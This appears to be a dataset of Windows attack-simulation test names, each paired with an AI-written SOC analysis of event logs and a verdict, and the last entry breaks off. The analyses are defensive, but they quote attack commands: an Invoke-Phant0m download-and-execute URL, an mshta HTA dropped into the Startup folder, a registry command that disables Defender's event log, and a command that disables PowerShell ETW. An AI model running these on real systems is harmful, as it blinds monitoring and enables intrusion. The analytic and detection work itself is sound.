Kill Event Log Service Threads,"After a thorough analysis of the provided event logs, the following observations and conclusions can be noted:

### Observation:

1. **Time Change Events:**
   - There are several events from the `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Security-Auditing` logs indicating a time change (EventID: 24). This by itself can be benign, but it is often important to correlate such events with other logs to determine if there is any suspicious activity around the same time.

2. **Process Execution:**
   - The Windows Sysmon logs show the execution of common system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by the user `SERVER002\admin_test`. These processes, particularly `wevtutil.exe` and `whoami.exe`, could be leveraged in malicious activities but are not inherently suspicious in standard log entries.
   - However, there is a critical observation around the process `powershell.exe` which invokes a script from the URL `https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1`.

3. **PowerShell Activity:**
   - The PowerShell logs indicate the execution of a script named `Invoke-Phant0m`, which is a known tool used to evade security monitoring by clearing Windows event logs. The command line shows it is downloaded and executed from an internet source (`raw.githubusercontent.com`), which is uncommon for legitimate scripts in a secure environment.
   - The execution policy is being set to `RemoteSigned`, which allows for scripts downloaded from the internet, indicating a potential risk of running untrusted scripts.

4. **Security Audit Events:**
   - The `Microsoft-Windows-Security-Auditing` logs show successful logons and the use of administrative privileges (EventID: 4672 shows privileges like `SeDebugPrivilege`), which are standard for an admin account but critical if used to escalate and conduct unauthorized activities.

5. **Windows Defender:**
   - Application logs indicate that Windows Defender is turned on (EventID: 15), suggesting that basic endpoint security is in place, but further investigation is advisable to ensure its integrity and coverage against advanced threats.

### Assessment:

Based on the analysis, the use of PowerShell to download and execute a potentially harmful script from an external website is indicative of malicious or highly suspicious behavior. The script name `Invoke-Phant0m` is especially concerning as it’s known for being used in cyberattacks to evade detection.

### Conclusion: MALICIOUS

This activity indicates a compromise, as the usage pattern matches known indicators of attack scenarios aiming to interfere with system logging and monitoring systems. Here’s how to proceed:

1. **Immediate Action:**
   - Isolate the affected host (Server002) from the network to prevent further potential exfiltration or lateral movement.
   - Assess other systems within the network for similar indicators of compromise.
   - Retain and analyze additional logs and disk images for a comprehensive investigation.

2. **Further Investigation:**
   - Identify and remediate the source of compromise, possibly stemming from misuse of administrative accounts.
   - Perform a complete threat assessment to determine other affected resources and systems.

3. **Strengthen Defense:**
   - Enforce stricter PowerShell execution policies and employ Application Whitelisting.
   - Monitor for unauthorized scripts and internet access requests by privileged accounts.
   - Ensure endpoint security solutions are updated to recognize such exploits and prevent their execution.

This approach ensures a detailed review of all potential risk factors discovered during this analysis."
Msiexec.exe - Execute Local MSI file with an embedded DLL,"Upon reviewing the provided Windows event logs, several observations can be made regarding the potential for malicious activity.

1. **Unusual Usage of PowerShell**:
    - There are multiple instances of PowerShell execution with the `-nop` (no profile) and `-Command` options, which can indicate suspicious activity, as these options are often used in script-based attacks to evade detection. The specific command used is `Write-Host CustomAction export executed me; exit`, which could be part of a benign script or task but warrants further investigation since usage of PowerShell with such flags is often flagged in security contexts.
    - Event ID: 17992, 17999, 18000 (PowerShell)

2. **MSI Installation via Command Line**:
    - There is a log entry indicating that an MSI installation was conducted using `msiexec.exe` with `/q /i` flags, which indicate a quiet installation that does not provide user feedback. The MSI was executed from a temporary location (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_DLL.msi`). This behavior can potentially be used to deliver and install unwanted or malicious software without user knowledge.
    - Event ID: 17997, 2384, 2385 (System and Application Logs)

3. **Frequent Execution of MicrosoftEdgeUpdate**:
    - There are numerous entries related to Microsoft Edge Update processes being executed. While the Edge Update is a common process for updating the browser, the frequency and variety of paths, including a temporary path (`C:\\Program Files (x86)\\Microsoft\\Temp\\EU99E4.tmp`), raises a concern for potential misuse or tampering.
    - Event ID: 17995, 17996, 18008 (Sysmon Log)

4. **Pattern of Elevated Privileges**:
    - Security logs show several Event ID 4672 entries, indicating that accounts were granted special privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others. While SYSTEM-level privileges are normal for certain operations, monitoring should ensure these are appropriately correlated with authorized tasks.
    - Event ID: 30340, 30352, 30354 (Security Logs)

5. **Unexpected Process Executions**:
    - Processes like `wsmprovhost.exe`, `whoami.exe`, and `HOSTNAME.EXE` were executed in tandem, which may indicate an attempt to gather system information. While individually these actions might be benign, their simultaneous execution warrants further investigation.
    - Event ID: 17982, 17987 (Sysmon Log)

Based on the analysis, the behavior in the logs appears to necessitate further investigation. While some activities could be attributed to legitimate administrative tasks or updates, the potential usages of PowerShell, quiet installations, and unconventional execution patterns cannot be dismissed without additional context.

**Resolution: SUSPICIOUS**
- Recommend immediate steps include confirming the legitimacy of the detected MSI installation and PowerShell executions.
- Review any recent administrative tasks or scheduled jobs that might explain these behaviors.
- Conduct a thorough endpoint security check to ascertain any unauthorized software or breach attempts.

The findings underscore the importance of vigilance but do not definitively indicate compromise without further evidence."
Mshta Executes Remote HTML Application (HTA),"Upon analyzing the provided log entries, here are the findings:

### 1. **Suspicious PowerShell Activity**

The Windows PowerShell logs show several events where a PowerShell script is executed with the following commands:
- An `Invoke-WebRequest` fetches a file from a GitHub URL: `https://raw.githubusercontent.com/file/file-file/master/files/data.005/src/data.005.hta`.
- This file is saved to the startup directory: `""$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\data.005.hta""`.
- The `mshta` command is used to execute the HTA file: `mshta` launches a file typically associated with HTML applications.
- The script contains a `Stop-Process -name ""calculator"" -Force` command.

These activities indicate potentially malicious actions:
- **Downloading and executing scripts from an external source** like GitHub can be risky, especially if files are automatically executed or stored in the startup folder.
- **Mshta.exe** is a utility that runs Microsoft HTML Applications. It's commonly used in attacks to execute scripts remotely fetched, indicating potentially adversarial behavior aimed at ensuring persistence.
- **Terminating running processes** (calculator in this case) could be an attempt to hide malicious activity or free up resources for another operation.

### 2. **Application and System Logs**

- These logs mainly consist of updates and normal service activities related to Microsoft Edge Update, Microsoft Software Protection Platform Service, and other system operations. There doesn't appear to be any overtly malicious activity here beyond the normal update and service functions.
  
### 3. **Sysmon Logs**
  
- There are multiple entries of Sysmon capturing the execution of various commands and processes, including the aforementioned PowerShell activity.
- The `mshta.exe` process execution triggered after being called by PowerShell corroborates the potentially malicious behavior noted in the PowerShell logs.
- The creation and execution of `cmd.exe` with the command `calc.exe` might be a benign action; however, in the context of the observed suspicious script, this might be an attempt to masquerade actions or test environment success.

### Assessment and Resolution

Given the observed PowerShell activity, especially the downloading and execution of files from external sources using mshta, the logs indicate a potential compromise attempt on the system:

- **Resolution**: **MALICIOUS**
  
### Guidance on How to Proceed

1. **Immediate Actions**:
   - Quarantine the impacted host (Server002) from the network to prevent potential spread.
   - Terminate any suspicious processes associated with mshta and PowerShell if still running.

2. **Forensic Investigation**:
   - Review the fetched HTA file and its contents to understand the full scope of its actions.
   - Investigate the origin and purpose of the GitHub file and contact the responsible party if necessary.
   - Thoroughly check for any additional Indicators of Compromise (IoCs) on the host.

3. **Mitigation and Containment**:
   - Implement network restrictions to prevent unauthorized external communications.
   - Update security policies around script execution and enhance PowerShell logging for future incidents.

4. **Review and Strengthen Defense**:
   - Audit administrative permissions and practices to ensure only necessary actions are permitted.
   - Conduct regular staff awareness training on the dangers of executing scripts from unverified sources.
   - Regularly update all systems with the latest security patches.

By taking these steps, the organization can reduce the potential risk and impact of such threats in the future."
Windows - Modify file last access timestamp with PowerShell,"### Analysis

Upon reviewing the provided Windows event logs, several observations stand out which could indicate suspicious activity:

1. **PowerShell Activity (Windows PowerShell Log)**
   - A PowerShell command was executed that attempted to modify the `LastAccessTime` attribute of a file (`data.006_timestomp.txt`) to `01/01/1970 00:00:00`. This technique is known as ""timestomping,"" a method often used by attackers to manipulate file timestamps to obfuscate malicious activities. The use of such a technique can be suspicious, especially if not aligned with normal administrative tasks.

2. **Sysmon Logs**
   - There are multiple instances of `powershell.exe` executing with potentially suspicious command-line arguments that coincide with the PowerShell logs, reinforcing suspicions of the timestomping activity.
   - The `whoami.exe` execution, while benign on its own, is coupled within similar context and timeframe, possibly being used to validate the current user's permissions or identity post-execution of a task.
   - The processes executed under the `SERVER002\admin_test` user account are worth noting, as admin-level accounts can potentially be targets for adversaries seeking to elevate privileges or perform unauthorized actions.

3. **Triggered Binaries**
   - The presence of `wevtutil.exe` (a utility for Windows event logs) running multiple times implies potential tampering or querying of event logs, possibly to cover tracks or monitor system changes without typical alerts.
   - `conhost.exe` executions, while common as part of console window operations in Windows, are frequent here and alongside suspicious PowerShell activity raise slight concern. However, they are often involved in benign processes and require context for deeper investigation.

### Assessment

Overall, the logs provide multiple indicators of potentially suspicious activity:
- **Timestomping via PowerShell** is traditionally associated with malicious activity.
- Execution of system utilities like `wevtutil.exe` suggests possible tampering or increased scrutiny on logs which is worth deeper examination, especially underprivileged accounts.
  
Given these observed behaviors, an individual assessment cannot definitively conclude malicious activity without further investigation of related context (e.g., recent changes to user roles, correlation to network events, endpoint protection alerts).

### Resolution: SUSPICIOUS

While not conclusively malicious, the activities observed in the logs—particularly the manipulation of file timestamps via PowerShell—are atypical for benign actions and warrant further investigation. It's recommended to:
- Conduct a more thorough review of activities around the log timestamp to identify related events or anomalies.
- Validate these actions with the expected behavior and authorization for such changes, potentially involving the user `admin_test`.
- Implement additional monitoring on `Server002` for subsequent unusual PowerShell or system utility usage to better capture if an anomaly pattern persists.
- Consider alerting or involving IT security operations for a more detailed forensic investigation into the potential compromise.

This investigation and suggestion for a more rigorous follow-up will help in determining if these behaviors align with regular operations or point towards a security incident requiring containment."
Disable Windows Error Reporting Settings,"Upon reviewing all provided logs, there are several notable events and activities that merit further investigation:

1. **Security Log Analysis:**
   - **Time Change (Event ID 4616):** There are entries where the system clock was changed (`2024-10-24 16:42:53` to `2024-10-24 16:42:50`). While this can sometimes occur due to legitimate system updates or corrections, it can also be a tactic used by attackers to cover their tracks by altering timestamps. 
   - **Privilege Use (Event ID 4672):** The user `admin_test` is noted to have several high-level privileges assigned, such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc. This is a common behavior for administrative accounts but could signal potential misuse if unusual activities are linked to this account elsewhere in the logs.

2. **Sysmon Log Analysis:**
   - **Command Execution (Sysmon Event ID 1):** The execution of `cmd.exe` with a command that modifies Windows Defender registry settings (`DisableEnhancedNotifications`) is suspicious. Disabling or modifying security software settings can be an indicator of malicious activity.
   - **Wevtutil.exe and Conhost.exe Invocation:** The frequent appearance of processes like `wevtutil.exe` and `conhost.exe` run by `SERVER002\admin_test` is worth further scrutiny. These tools can be used for legitimate purposes but may also be used to export or clear event logs to hide malicious activity.
   - **Miscellaneous Tool Use:** Frequent execution of tools such as `hostname.exe`, `whoami.exe`, and `conhost.exe` should be investigated. While these are legitimate Windows utilities, their use in conjunction might indicate reconnaissance activity.

3. **General Observations:**
   - **Execution Context:** The integrity level of processes (High) indicates execution with elevated privileges, consistent with admin-level activity.
   - **Parent-Child Process Relationships:** The process hierarchy starts with `wsmprovhost.exe`, which is typical of WMI Provider Host operations. However, activities stemming from this could represent malicious automation or scripting if not aligned with expected workflows.

**Assessment:**
The combination of time manipulation, registry modifications targeting security features, and the use of administrative privileges aligns with potentially malicious behavior patterns. It is particularly concerning when these processes could be aligned to attempts at obfuscating activities or executing unauthorized changes to the system’s security configurations.

**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct a detailed system audit focusing on the user `admin_test` to verify the legitimacy of their actions during the timeframe of the logs.
- Inspect system settings and configurations at and around the specified timestamps to identify any unauthorized changes or security risks.
- Correlate these findings with network activity logs to identify any potential external connections that coincide with these events.
- Consider isolating the affected system and conducting a more thorough forensic analysis to ensure no further malicious activities are taking place."
Disable Powershell ETW Provider - Windows,"After thoroughly reviewing the provided Windows event logs, there are several indicators suggestive of potentially malicious activity:

1. **PsExec Execution**: The logs show an execution of `PsExec.exe` from the `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\pstools\\`. This tool is widely known for being used by both system administrators for legitimate purposes and by attackers for lateral movement or remote execution of commands.

2. **Usage of Elevated Privileges**: The PsExec command is being executed with arguments `-accepteula -i -s`, which force PsExec to operate interactively with elevated (SYSTEM) privileges. Executing a command as SYSTEM using PsExec is often a sign that administrator-level access is being used to achieve potentially unauthorized tasks.

3. **Modification of PowerShell Event Tracing**: The command executed modifies the event trace `logman update trace ""EventLog-Application"" --p ""Microsoft-Windows-Powershell"" -ets`, which could be an attempt to manipulate or suppress logging related to PowerShell activities. This suppressive action is a technique often employed by malware or attackers to obscure evidence of their activity.

4. **Presence of PSEXESVC Service**: The creation of the `PSEXESVC` service indicates that PsExec was used in a service context, which might mean an attacker is establishing persistence or remote access capabilities.

5. **Transitory Nature of Logs and Services**: The use of temporary file locations and services suggests that these actions are intended to be temporary, avoiding attention and making post-incident analysis harder.

Assessment of the overall situation leads to identifying these event patterns as typical of post-exploitation activity. The execution of administrative-level commands remotely and the manipulation of logging are hallmark traits of malicious behavior. Based on the observed activity, I would classify these logs under the resolution:

- **MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Containment**: Consider isolating the affected system (Server002) from the network to prevent further action by the attacker or propagation of any malicious activity.
- **Detailed Forensic Analysis**: Conduct a complete memory dump and disk image for forensic examination. This will help unveil the full context and potentially identify the adversary's footprint, methods, and tools.
- **Review of Access Logs**: Cross-verify any recent user account access logs to determine if there are any associated anomalies or unauthorized logons.
- **Network Monitoring**: Increase scrutiny on outbound traffic from Server002 to detect any data exfiltration efforts or command and control communication.
- **Security Patch Validation**: Ensure all systems, especially those with administrative tools like PsExec, are patched and follow least privilege principles.
- **Administrative Filtering**: Ensure that the use of administrative tools like PsExec is closely monitored and restricted to necessary personnel, reinforcing the use of secure administrative practices.

These actions should help in mitigating the threat while ensuring a comprehensive investigation into the incident origins and impacts."
Regsvr32 local DLL execution,"### Detailed Analysis of the Logs:

Upon analyzing the given Windows event logs, here are the notable findings and potential indicators of suspicious activity:

1. **Suspicious Use of Built-in Tools:**
   - Multiple instances of command prompt (`cmd.exe`), PowerShell (`powershell.exe`), and Windows Event Utility (`wevtutil.exe`) executions, especially under the same user `""SERVER002\\admin_test""`, can be indicative of a potential misuse or scripted automation.
   - **Wevtutil.exe**: This utility is typically used by administrators to manage event logs, and its presence multiple times without evident justification could suggest an attempt to clear event logs or investigate logs without leaving traces.
   - **PowerShell.exe**: The execution of PowerShell without additional context (scripts or command line arguments) may be normal, but it could also be suspicious if triggered by unauthorized users or from unusual sources.

2. **Potential DLL Registration via Regsvr32.exe:**
   - The use of `regsvr32.exe` to register `AllTheThingsx86.dll` from a temporary file location (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.010\\bin\\AllTheThingsx86.dll`) is suspicious. Regsvr32 is a legal tool that can be used by attackers to execute arbitrary scripts or bypass security controls if used maliciously. Registration of DLLs from temporary directories often raise red flags.
   - The command line conditional usage `(IF \""%PROCESSOR_ARCHITECTURE%\""==\""AMD64\""...)` provides a further indication that this might be part of a scripted execution designed for specific architectural targets.

3. **Edge Update Activity:**
   - Normal operations related to the Microsoft Edge Update are observable; however, an Edge update executing from a temporary directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\EUA54E.tmp\\`) might be a cause for concern unless verified as part of standard operations or troubleshooting measures.

4. **Processes and Integrity Level:**
   - Several processes are running at a `High` integrity level. This itself is not directly indicative of malicious activity but could suggest elevated privileges that, if in the hands of an attacker, can be a cause for concern. Consistent high integrity operations without clear operational requirement should be verified.

### Assessment:
- **SUSPICIOUS**: The logs indicate potential suspicious activities that require further investigation. The abundance of Wevtutil.exe, PowerShell, and cmd.exe executions, coupled with the potentially unauthorized registration of DLLs via Regsvr32, cannot be definitively classified as benign without additional context. 

### Recommended Actions:
1. **Detailed Investigation:**
   - Review the context around the usage of `wevtutil.exe`, `powershell.exe`, and `cmd.exe` to determine if they align with legitimate administrative tasks or if they were potentially used maliciously.
   - Verify the origin and legitimacy of `AllTheThingsx86.dll` and its necessity within standard operations.
   
2. **Monitoring and Alerts:**
   - Implement alerts for unusual practices such as DLL registration in non-standard directories or repeated use of PowerShell/Wevtutil by certain users.

3. **User Activity Validation:**
   - Confirm recent activities and required access/control for the user `SERVER002\\admin_test` to ensure it was not compromised.

4. **Review Microsoft Edge Update Logs:**
   - Validate whether all Microsoft Edge Update activities are routine software updates initiated by a trusted process or entity.

With further context and corroborating evidence, the determination could potentially shift, but current evidence posits potential risk factors needing deeper analysis."
SIP (Subject Interface Package) Hijacking via Custom DLL,"### Analysis of the Logs

1. **Application Log**
   - **Software Protection Platform Service**: These events (EventID 16384 and 16394) indicate routine activities related to Windows licensing and didn’t show any anomalies.
   - **Edge Update Service Stopped**: Stopping of the edge update service is typical and not necessarily indicative of malicious activity unless it is unexpected. However, without further context, this appears routine.

2. **Windows PowerShell Log**
   - **PowerShell Commands**: Observations of PowerShell execution include commands like `Write-Host 'Final result: 1'` and inspection of INF files in the directory `$env:WinDir\inf`. The execution policy is set to ""Restricted"", which is generally safe; however, the commands inspecting INF files are unusual for routine operations unless related to a specific legitimate script or system diagnostic.

3. **System Log**
   - **Windows Update Activities**: There are numerous update entries (EventID 44). This may indicate system maintenance and updates which are typical for Windows environments.

4. **Sysmon Log**
   - **Process Execution**: Notably, `cmd.exe` is used to execute `regsvr32.exe` with a DLL located in a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\GTSIPProvider.dll`. This specific activity can be suspicious given regsvr32 can load DLLs remotely and this file path is non-standard, which can be indicative of persistence mechanisms used by adversaries.
   - **Frequent EdgeUpdate Executions**: This is observed, which in isolation appears benign as part of the automatic update checks unless directly linked with timing to malicious activities.

5. **Security Log**
   - **Privilege Escalation**: Multiple EventID 4672 indicate special privilege assignments. These in themselves aren't directly indicative of malicious behavior, assuming these are part of expected use or maintenance activities.
   - **Credential Reading Attempts**: Multiple EventID 5379 events with ReturnCode `3221226021` suggest failed access to credentials possibly expected by the process running the telemetry or diagnostics.

### Assessment and Recommendations

**Suspicious Activities:**
- Inspection of INF files and DLL registration via `regsvr32.exe` are behaviors that warrant further attention. These may indicate attempts to modify system configurations or establish persistence.

### Resolution

Given the combination of:
- Observation of PowerShell commands used to inspect non-typical paths and systemic components.
- Commands execution (`regsvr32.exe`) that are known to be leveraged by attackers for proxy execution and persistence.
- The INF inspection via PowerShell and the specific DLL registration event.

The logs should be classified as **SUSPICIOUS**. There is a need for further investigation into the processes executing these commands, validation against authorized scripts, and understanding their purpose or confirmation of benign intent. Actions may include:
- Checking for additional signs of intrusion tied to these commands.
- Ensuring system integrity checks and possibly reverting suspicious changes.
- Conducting threat hunts across systems for similar indicators of compromise.
"
Modify RDP-Tcp Initial Program Registry Entry,"### Detailed Analysis

Upon reviewing the provided Windows event logs across multiple sources—System, Application, Security, Sysmon, and others—a few key observations can be made that are particularly notable for potential malicious activity. Below is a breakdown of the findings:

#### System Log Analysis
- **Time Change Events**: There are multiple events indicating a time change on `Server002`:
  - **Event IDs 24 and 1** (from the Kernel-General): The old time is set ahead and then adjusted backward. While time adjustments can occur legitimately (e.g., NTP adjustments or timezone changes), frequent and unexplained changes may indicate an attempt to manipulate time-sensitive logs.
  - **Event ID 35** (Windows Time Service): Synchronization with `time.windows.com`, which is a legitimate Windows Time service.

#### Application Log Analysis
- The **Microsoft Windows Security SPP** (Software Protection Platform) service appears to be operational without issues.
- **Edge Update Service** stopped several times (`EventID 0`). This may be normal behavior for service updates, but frequent stops/starts can also be indicative of instability or a targeted restart to bypass a security restriction.

#### Security Log Analysis
- **Event ID 4672**: An account with high-level privileges (`admin_test`) was granted special privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) which is typical for an admin account but can be concerning if unexpected.
- **Event ID 4624 and 4634**: Logon and logoff events for the `admin_test` account using NTLM, indicating potentially legitimate remote access.
- **Event ID 4616**: Adjustments to system time linked to the `svchost.exe` process, suggesting time change might be irrelevant, correlating with System log time changes.

#### Sysmon Log Analysis
- **Process Creation Events**:
  - Execution of `whoami.exe`, `wevtutil.exe`, `cmd.exe`, `reg.exe`, and `conhost.exe` by the `admin_test` user. The combination of these process activities is commonly used in enumeration and modifying system configurations or logs.
  - **Command Execution**: A particularly concerning command was executed using `cmd.exe` regarding Registry modifications to RDP settings (`reg add HKLM\SYSTEM...`). This change allows a specific program to be the initial program of a remote session, which aligns with lateral movement techniques.
- **File Modification Events**: Regular operation of Microsoft Edge Update processes, likely part of normal update cycles.

### Assessment and Resolution
- **Suspicious Indicators**: While there's evidence of legitimate administrative activity, the registry modification and time adjustments require further investigation to confirm their benign nature. The presence of special privileges, combined with these activities, could indicate potential misuse.
- **Risk Identified**: Potential risk of privilege abuse or lateral movement within the network.

### Recommended Actions
1. **Verify**: Confirm with the respective user or admin (`admin_test`) to validate if the actions were expected and necessary for routine maintenance or configuration.
2. **Monitor**: Increase monitoring on `Server002` for continued registry changes or potentially harmful administrative actions.
3. **Review**: Check associated accounts for any unauthorized access patterns or work beyond normal hours indicating lateral movement risk.
4. **Secure**: If necessary, consider reconfiguring security policies to provide additional layers of restriction to this server and its critical configuration settings.

### Conclusion
**RESOLUTION: SUSPICIOUS** - The series of registry changes and time adjustments, accompanied by elevated privileges, indicate activity warranting further investigation to confirm the user's intention and scope of the changes."
LockBit Black - Disable the ETW Provider of Windows Defender -cmd,"Upon reviewing the supplied Windows event logs, here's a detailed analysis of any suspicious or anomalous behavior:

### Anomalous and Suspicious Behavior Analysis:

1. **Use of `wevtutil.exe`**:
   - The `wevtutil.exe` utility is a legitimate Windows tool used to manage event logs. There are multiple instances of `wevtutil.exe` execution logged by Sysmon:
     - It was executed several times by the user `SERVER002\\admin_test`.
     - Frequent and automated-like usage of `wevtutil.exe` may be part of normal administrative activity or could indicate an attempt to clear event logs to cover tracks.
   
2. **Modification of Windows Defender Event Log Settings**:
   - A `cmd.exe` process executed the command to modify registry settings with `reg.exe`:
     ```shell
     ""cmd.exe"" /c reg add ""HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /t REG_DWORD /d 0 /f
     ```
   - This command disables the Windows Defender event log, which is highly suspicious and often utilized to avoid detection by security monitoring tools, as it could indicate an attempt to bypass security logs.

3. **Repeated Execution of System Utilities**:
   - The repeated use of `conhost.exe` alongside system utilities such as `whoami.exe` and `hostname.exe` by the same user suggests potential scripting activity. While not inherently malicious, depending on context, it could indicate attempts to gather information about the system and the logged-in user, possibly for reconnaissance purposes.

### Assessment:
- The logs contain evidence that could suggest suspicious or potentially malicious activity based on the patterns observed.
- The modification to the Windows Defender event logging settings is particularly concerning because it suggests an attempt to alter security configurations.

### Resolution:
**SUSPICIOUS** - The logs contain activity that is concerning and requires further investigation. Specifically, the registry change disabling Windows Defender logging and the multiple executions of system utilities by a user in a high-integrity context are suspicious.

### Next Steps:
1. **Conduct a Detailed Investigation**:
   - Verify if the `admin_test` account activity is expected and authorized. This may involve interviewing the user or their supervisor.
   - Investigate if there are any known scripts or automation tasks that might account for these actions legitimately.

2. **Examine File Integrity and Indicators of Compromise**:
   - Review the system's integrity and check for signs of any unauthorized changes or potential malware indicators not covered by the logs.

3. **Enable Security Logging and Monitoring**:
   - If not already in place, ensure that the security logging is appropriately configured, especially concerning Windows Defender and other critical system components.

4. **Perform a Security Audit**:
   - Evaluate system security configurations and user permissions to identify any deviations from best practices."
Add domain to Trusted sites Zone,"Upon reviewing the provided logs, there are several noteworthy observations:

1. **PowerShell Activity**:
   - Multiple PowerShell events indicate a script was executed to modify the registry settings for internet domains. The script creates a new subdomain entry for `bad-domain.com` in the ZoneMap registry and sets properties related to HTTP and HTTPS to a DWORD value of 2. This activity is typically associated with altering internet security settings which can enable or facilitate malicious activities.

2. **Process Execution**:
   - The Sysmon logs indicate the presence of several processes executed with `NT AUTHORITY\SYSTEM` privileges. A common process seen is `MicrosoftEdgeUpdate.exe`, relating to the Microsoft Edge update service, which seems to be updating regularly. This by itself is not unusual, but frequent executions in a short timeframe could be anomalies; however, without more context or additional corroborative suspicious activity, this appears benign.

3. **Registry Modifications**:
   - The PowerShell script’s registry modifications to the `ZoneMap\Domains` often associate with browser-related vulnerabilities or Public Key Infrastructure manipulations, indicating potential preparation for more complex or layered attacks.

4. **User Activity**:
   - The account `SERVER002\admin_test` has been involved in some process executions, like `conhost.exe` and `wevtutil.exe`. Although these are legitimate processes, running command-line utilities via an admin account without documented purpose can generate suspicion, particularly in conjunction with other suspicious activities.

5. **Summary of Findings**:
   - The PowerShell script execution, specifically targeting the registry to affect internet security zones, stands out as potentially malicious.
   - High privilege process executions (like using `SYSTEM` for PowerShell executions) combined with registry manipulations often link to elevated risks of exploitation or configuration compromise.

**Assessment**: 
- The logs contain signs of potentially malicious activity, especially focused on registry manipulations via PowerShell with more privileges than necessary, directed by an unusual domain. This requires further investigation, as it may suggest preparatory steps for a more serious attack or backdoor opening.

**Resolution**: 
- **SUSPICIOUS**: While there is no definitive proof of malicious intent without further context, the identified activities are inconsistent with normal behavior and suggest the potential for compromise or abuse. Additional scrutiny and monitoring are recommended to understand the full scope, purpose, and impact of these actions, ideally including communication with the involved personnel and checking the integrity or recent changes in the affected systems."
Tamper with Windows Defender ATP using Aliases - PowerShell,"After reviewing the provided Windows event logs, here are the significant observations and assessments:

### Indicators of Suspicious or Anomalous Activity:

1. **Time Change Events:**
   - **System Log Event 24:** The system time was rolled back from `2024-10-28 09:26:03.9550014` to `2024-10-28 09:25:55.5285017`. Time changes can be legitimate, but they may also be used to cover up traces of malicious activity. This event should be examined for the legitimacy of the time change.

2. **Privileges and Logon Activity:**
   - **Security Log Event 4672:** The account `admin_test` was granted several high-level privileges including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. This suggests administrative-level activities that might not be normatively conducted unless necessary for administration.

3. **PowerShell Execution:**
   - **Sysmon Log Event 17977 & Windows PowerShell Events:** Execution of PowerShell setting Windows Defender preferences (`Set-MpPreference`) is indicative of modification of antivirus settings which is a common indicator of malware attempting to disable or evade detection.

4. **Windows Defender Status:**
   - **Application Log Events:** Windows Defender's state was frequently set to ""SECURITY_PRODUCT_STATE_SNOOZED."" This suggests it was periodically disabled, which could be a tactic used by malware to evade detection.

5. **Frequent Process Executions:**
   - **Sysmon Log:** Frequent execution of `MicrosoftEdgeUpdate.exe` and its subsequent processes might indicate benign automatic updates but could also signal abuse for persistence if manipulated by an adversary.

### Assessment:

Based on the above observations, the logs indicate actions that align with potential malicious behavior, including system time alteration, administrative-level privilege use, disabling security protocols, and suspicious scripting activity.

### Resolution: **SUSPICIOUS**

The events documented are not conclusively malicious based on logs alone but are highly suspicious. They warrant further investigation to determine the legitimacy of changes and ensure they align with administrative and operational policies:

1. **Investigate Time Change:**
   - Verify if the time change was an authorized action, e.g., due to network time service correction.

2. **Review `admin_test` Activity:**
   - Investigate to ensure administrative privileges were used in alignment with expected duties.

3. **Examine PowerShell Commands:**
   - Verify if the PowerShell commands altering Windows Defender are authorized and intentional.

4. **Windows Defender Checks:**
   - Determine why Windows Defender has been snoozed and ensure no unauthorized settings change.

5. **Validate Edge Update Activities:**
   - Confirm Microsoft Edge update processes and their frequency correspond with a typical update schedule.

### Guidance:

Proceed with further investigation into each suspicious activity. Verify these were conducted under legitimate and approved conditions or take corrective action if not. Strengthen monitoring and involve IT operations to confirm infrastructural activities align with logged data."
Modify registry to store logon credentials,"Based on the analysis of the provided Windows event logs, there are several significant observations:

1. **Time Change Events:** There are multiple log entries related to the time change on October 24, 2024, which are unusual. The time appears to be set back, as indicated by event IDs 4616 in the Security log and event ID 24 in the System log. These changes are performed by the `svchost.exe` process under `LOCAL SERVICE`. While time adjustments are typically benign and may occur due to legitimate reasons such as synchronization with a time server, unauthorized changes can potentially facilitate malicious activities like timestamp manipulation in logs to cover tracks.

2. **Service and Process Executions:** 
   - Repeated execution of `svchost.exe` and `wevtutil.exe` indicates possible normal background operations, but the frequent execution of `wevtutil.exe`, which is a command-line utility for managing event logs, might warrant further inspection if it appears out of regular administrative activities.
   - `conhost.exe` and `wevtutil.exe` executed by the user `admin_test` don't immediately raise alarms without more context but should be reviewed in the context of this user's typical activities.

3. **Sysmon Logs:**
   - The execution of `cmd.exe` with a command modifying the `WDigest` registry setting (`reg add... /f`) is critical. This modification can enable credential harvesting in memory (using Mimikatz-like techniques), which is typically seen in malicious activities aiming for unauthorized access or privilege escalation.
   - Pairing of `cmd.exe` as a parent process of `reg.exe` emphasizes the execution chain potentially indicative of a planned change or malicious configuration.

4. **Edge Update Processes:** There are numerous entries related to Microsoft Edge Update operations. These logs generally indicate routine updates and service tasks, but in combination with the aforementioned suspicious behavior (particularly the registry modification), they may serve as cover noise for more malicious actions.

**Risk Assessment and Conclusion:**

- The evidence supports suspicious activity primarily due to the registry modification related to `WDigest` which is often associated with attempts to facilitate credential theft.
- The time change events, while not inherently malicious, combined with potential unauthorized configuration changes, suggest behavior that warrants deeper examination.

Given these considerations, the final assessment is:

- **Resolution: SUSPICIOUS** - The activity within the logs, especially the registry modification action, needs further investigation. It's recommended to:
  1. Verify if the time changes aligned with legitimate maintenance or synchronization activities.
  2. Investigate if the registry change was authorized and by whom.
  3. Monitor further for any increase in unusual or unauthorized access attempts or escalation of privileges.
  4. Perform a security review or audit of the Server002 system to ensure it hasn't been compromised and assess any potential lateral movement or persistence mechanisms."
Disable Windows Change Password Feature,"After reviewing the provided event logs, the following analysis highlights the key points and concludes with an assessment.

### Analysis of Event Logs:

1. **General Sysmon Events:**
   - The logs contain numerous entries related to typical system processes such as `whoami.exe`, `conhost.exe`, `wsmprovhost.exe`, and others related to Microsoft Edge update processes. These processes are standard and well-known Windows components.
